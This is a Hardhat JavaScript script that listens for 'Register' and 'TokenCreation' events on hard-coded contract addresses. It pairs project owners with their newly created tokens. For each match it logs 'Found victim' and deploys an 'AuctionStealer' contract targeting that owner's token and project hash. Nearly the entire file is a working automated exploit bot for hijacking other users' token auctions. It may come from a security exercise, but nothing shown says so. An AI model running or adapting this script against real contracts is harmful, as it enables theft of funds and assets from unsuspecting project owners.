

const { ethers, upgrades } = require('hardhat');

async function main () {

  const maestroAddress = "0x5258A94275071Db1AfF9D49c44f2d7E4469d5EB1";
  const projectRegisterAddress = "0xd2b6aA1e5449A7F1fD1C54BaAE8BCfDa40744f5a";
  const sucoinAddress = "0xb6e466F4F0ab1e2dA2E8237F38B2eCf6278894Ce";

  const [owner] = await ethers.getSigners();
  const address = await owner.getAddress();
  console.log(address);
  console.log(await ethers.provider.getBalance(await owner.getAddress()));

  projectOwners = {}
  
  projectRegisterFilter = {
    address: projectRegisterAddress,
    topics : [
      ethers.utils.id("Register(address,bytes32)")
    ]
  }

  tokenAssignFilter = {
    address: maestroAddress,
    topics: [
      ethers.utils.id("TokenCreation(address,string,string,address)")
    ]

  }

  ethers.provider.on(projectRegisterFilter, (log,event) => {
    console.log(log)
    const topics = log.topics;
    projectOwners[topics[1]] = log.data
    console.log(projectOwners)

  })

  ethers.provider.on(tokenAssignFilter, async (log,event) => {
    console.log(log)
    console.log(projectOwners)

    const topics = log.topics;
    const owner = topics[1];
    const projectHash = projectOwners[owner];

    

    if (projectHash != null) {
      console.log("Found victim")
      //address _maestro,address originalOwner,address sucoinAddress,address tokenAddress,bytes32 projectHash

      //original owner and tokenaddress needs depadding

      const [token,originalOwner] = [topics[2],owner].map(hexString => hexString.substring(0,2) + hexString.substring(26))


      const auctionStealerFactory = await ethers.getContractFactory("AuctionStealer");
      const auctionStealer = await auctionStealerFactory.deploy(maestroAddress,originalOwner,sucoinAddress,token,projectHash);
      await auctionStealer.deployed();
      console.log(`Stealer Auction Deployed for hash ${projectHash}`);

    }

    
    
  })


}

main();